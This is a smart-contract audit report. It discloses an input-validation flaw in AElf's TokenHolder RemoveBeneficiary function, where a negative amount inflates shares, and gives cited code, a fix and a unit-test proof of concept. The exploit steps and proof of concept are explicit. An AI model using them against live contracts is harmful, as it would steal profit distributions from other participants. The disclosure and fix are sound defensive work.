# Audit Report

## Title
Share Inflation via Negative Amount in RemoveBeneficiary Function

## Summary
The `RemoveBeneficiary` function in TokenHolderContract fails to validate that `input.Amount` is positive, allowing scheme managers to inflate beneficiary shares through negative values. When a negative amount is provided, the subtraction operation becomes addition, enabling arbitrary share manipulation without locking tokens and leading to theft of profit distributions from legitimate participants.

## Finding Description

The vulnerability exists in the `RemoveBeneficiary` function where `input.Amount` (defined as `int64` which accepts negative values) is used in arithmetic operations without validation. [1](#0-0) 

The critical flaw occurs in the conditional check and calculation. [2](#0-1) 

When `input.Amount` is negative (e.g., -100), the condition `lockedAmount > input.Amount` evaluates to true (e.g., 100 > -100 = true), and the subsequent calculation `lockedAmount.Sub(input.Amount)` becomes addition due to the mathematical property of subtracting a negative number. The `Sub` extension method performs simple subtraction without sign validation. [3](#0-2) 

The inflated shares value is then passed to `Profit.AddBeneficiary`, which only validates `shares >= 0`, allowing the artificially inflated positive value to pass through. [4](#0-3) 

In contrast, other functions correctly validate positive amounts. The `ContributeProfits` function in the Profit contract explicitly checks for positive amounts. [5](#0-4) 

## Impact Explanation

This vulnerability enables direct fund theft through dividend manipulation:

1. **Attack Vector**: Any user creates a TokenHolder scheme (becoming the manager with no special privileges required). [6](#0-5) 

2. **Share Inflation**: The attacker adds themselves as beneficiary with minimal shares (e.g., 100), then calls `RemoveBeneficiary` with a negative amount (e.g., -9900), inflating shares to 10,000 without locking any tokens.

3. **Fund Theft**: When legitimate users lock tokens via `RegisterForProfits` and profits are distributed, the attacker receives a disproportionate share. [7](#0-6) 

**Concrete Example**: 
- Attacker has 100 shares, inflates to 10,000 using negative amount
- Legitimate users lock 1000 tokens total (1000 shares)
- Total pool: 1100 ELF in profits
- **Expected distribution**: Attacker ~9 ELF (100/1100), Users ~1091 ELF
- **Actual distribution**: Attacker ~1000 ELF (10000/11000), Users ~100 ELF  
- **Theft**: ~991 ELF stolen from legitimate participants

## Likelihood Explanation

This vulnerability is highly exploitable:

- **Attacker Requirements**: None beyond standard user capabilities - any user can create a scheme
- **Attack Complexity**: Trivial - single function call with a negative integer parameter
- **Preconditions**: None - attacker simply creates scheme, adds self as beneficiary, and exploits before/after legitimate users join
- **Detection Difficulty**: Hard to detect since shares are stored in the Profit contract, not transparently visible
- **Economic Barriers**: Zero cost to execute, pure profit extraction

The absence of test coverage for negative amounts confirms this was overlooked. [8](#0-7) 

## Recommendation

Add input validation to ensure `amount` is non-negative:

```csharp
public override Empty RemoveBeneficiary(RemoveTokenHolderBeneficiaryInput input)
{
    // Add validation
    Assert(input.Amount >= 0, "Amount must be non-negative.");
    
    var scheme = GetValidScheme(Context.Sender);
    // ... rest of function
}
```

Alternatively, validate before the arithmetic operation to match the pattern used in `ContributeProfits`.

## Proof of Concept

```csharp
[Fact]
public async Task RemoveBeneficiary_NegativeAmount_InflatesShares_Test()
{
    // Setup: Create scheme and add beneficiary with initial shares
    await TokenHolderContractStub.CreateScheme.SendAsync(new CreateTokenHolderProfitSchemeInput
    {
        Symbol = "ELF"
    });
    
    await TokenHolderContractStub.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = Starter,
        Symbol = "ELF",
        Amount = 1000
    });
    
    var initialShares = 100L;
    await TokenHolderContractStub.AddBeneficiary.SendAsync(new AddTokenHolderBeneficiaryInput
    {
        Beneficiary = Starter,
        Shares = initialShares
    });
    
    var schemeIds = await ProfitContractStub.GetManagingSchemeIds.CallAsync(new GetManagingSchemeIdsInput
    {
        Manager = Starter
    });
    var schemeId = schemeIds.SchemeIds[0];
    
    // Get initial total shares
    var beforeScheme = await ProfitContractStub.GetScheme.CallAsync(schemeId);
    beforeScheme.TotalShares.ShouldBe(initialShares);
    
    // EXPLOIT: Call RemoveBeneficiary with negative amount
    var negativeAmount = -9900L;
    await TokenHolderContractStub.RemoveBeneficiary.SendAsync(new RemoveTokenHolderBeneficiaryInput
    {
        Beneficiary = Starter,
        Amount = negativeAmount
    });
    
    // Verify: Shares inflated instead of reduced
    var afterScheme = await ProfitContractStub.GetScheme.CallAsync(schemeId);
    var expectedInflatedShares = initialShares - negativeAmount; // 100 - (-9900) = 10000
    
    afterScheme.TotalShares.ShouldBe(expectedInflatedShares); // Proves vulnerability
    afterScheme.TotalShares.ShouldBeGreaterThan(beforeScheme.TotalShares); // Shares increased instead of decreased
}
```

## Notes

This vulnerability breaks the fundamental invariant that beneficiary shares should only increase through legitimate token locking via `RegisterForProfits`. The lack of input validation combined with mathematical properties of negative numbers creates an exploitable bypass that allows unprivileged attackers to steal funds from legitimate profit scheme participants. The fix is straightforward and follows the existing pattern used in other functions like `ContributeProfits`.

### Citations

**File:** protobuf/token_holder_contract.proto (L79-84)
```text
message RemoveTokenHolderBeneficiaryInput {
    // Beneficiary's address.
    aelf.Address beneficiary = 1;
    // The amount of weights to remove.
    int64 amount = 2;
}
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L14-35)
```csharp
    public override Empty CreateScheme(CreateTokenHolderProfitSchemeInput input)
    {
        if (State.ProfitContract.Value == null)
            State.ProfitContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.ProfitContractSystemName);

        State.ProfitContract.CreateScheme.Send(new CreateSchemeInput
        {
            Manager = Context.Sender,
            IsReleaseAllBalanceEveryTimeByDefault = true,
            CanRemoveBeneficiaryDirectly = true
        });

        State.TokenHolderProfitSchemes[Context.Sender] = new TokenHolderProfitScheme
        {
            Symbol = input.Symbol,
            MinimumLockMinutes = input.MinimumLockMinutes,
            AutoDistributeThreshold = { input.AutoDistributeThreshold }
        };

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L85-95)
```csharp
        if (lockedAmount > input.Amount &&
            input.Amount != 0) // If input.Amount == 0, means just remove this beneficiary.
            State.ProfitContract.AddBeneficiary.Send(new AddBeneficiaryInput
            {
                SchemeId = scheme.SchemeId,
                BeneficiaryShare = new BeneficiaryShare
                {
                    Beneficiary = input.Beneficiary,
                    Shares = lockedAmount.Sub(input.Amount)
                }
            });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L149-177)
```csharp
    public override Empty RegisterForProfits(RegisterForProfitsInput input)
    {
        Assert(State.LockIds[input.SchemeManager][Context.Sender] == null, "Already registered.");
        var scheme = GetValidScheme(input.SchemeManager);
        if (State.TokenContract.Value == null)
            State.TokenContract.Value =
                Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName);

        var lockId = Context.GenerateId(Context.Self,
            ByteArrayHelper.ConcatArrays(input.SchemeManager.ToByteArray(), Context.Sender.ToByteArray()));
        State.TokenContract.Lock.Send(new LockInput
        {
            LockId = lockId,
            Symbol = scheme.Symbol,
            Address = Context.Sender,
            Amount = input.Amount
        });
        State.LockIds[input.SchemeManager][Context.Sender] = lockId;
        State.LockTimestamp[lockId] = Context.CurrentBlockTime;
        State.ProfitContract.AddBeneficiary.Send(new AddBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            BeneficiaryShare = new BeneficiaryShare
            {
                Beneficiary = Context.Sender,
                Shares = input.Amount
            }
        });

```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-98)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
    }
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L217-222)
```csharp
    private void AssertValidInput(AddBeneficiaryInput input)
    {
        Assert(input.SchemeId != null, "Invalid scheme id.");
        Assert(input.BeneficiaryShare?.Beneficiary != null, "Invalid beneficiary address.");
        Assert(input.BeneficiaryShare?.Shares >= 0, "Invalid share.");
    }
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L657-660)
```csharp
        if (input.Amount <= 0)
        {
            throw new AssertionException("Amount need to greater than 0.");
        }
```

**File:** test/AElf.Contracts.TokenHolder.Tests/TokenHolderTests.cs (L155-196)
```csharp
    [Fact]
    public async Task RemoveBeneficiary_With_Amount_Test()
    {
        await TokenHolderContractStub.CreateScheme.SendAsync(new CreateTokenHolderProfitSchemeInput
        {
            Symbol = "ELF"
        });
        await TokenHolderContractStub.ContributeProfits.SendAsync(new ContributeProfitsInput
        {
            SchemeManager = Starter,
            Symbol = "ELF",
            Amount = 9999
        });
        await TokenHolderContractStub.AddBeneficiary.SendAsync(new AddTokenHolderBeneficiaryInput
        {
            Beneficiary = Starter,
            Shares = 1000
        });
        var schemeIds = await ProfitContractStub.GetManagingSchemeIds.CallAsync(new GetManagingSchemeIdsInput
        {
            Manager = Starter
        });
        var schemeId = schemeIds.SchemeIds[0];
        var beforeRemoveScheme = await ProfitContractStub.GetScheme.CallAsync(schemeId);
        var amount = 10;
        await TokenHolderContractStub.RemoveBeneficiary.SendAsync(new RemoveTokenHolderBeneficiaryInput
        {
            Beneficiary = Starter,
            Amount = amount
        });
        var afterRemoveScheme = await ProfitContractStub.GetScheme.CallAsync(schemeIds.SchemeIds[0]);
        afterRemoveScheme.TotalShares.ShouldBe(beforeRemoveScheme.TotalShares - amount);
        var profitAmount = await ProfitContractStub.GetProfitDetails.CallAsync(new GetProfitDetailsInput
        {
            Beneficiary = Starter,
            SchemeId = schemeId
        });
        profitAmount.Details.Count.ShouldBe(2);
        profitAmount.Details[0].Shares.ShouldBe(beforeRemoveScheme.TotalShares);
        profitAmount.Details[0].EndPeriod.ShouldBe(0);
        profitAmount.Details[1].Shares.ShouldBe(beforeRemoveScheme.TotalShares - amount);
    }
```
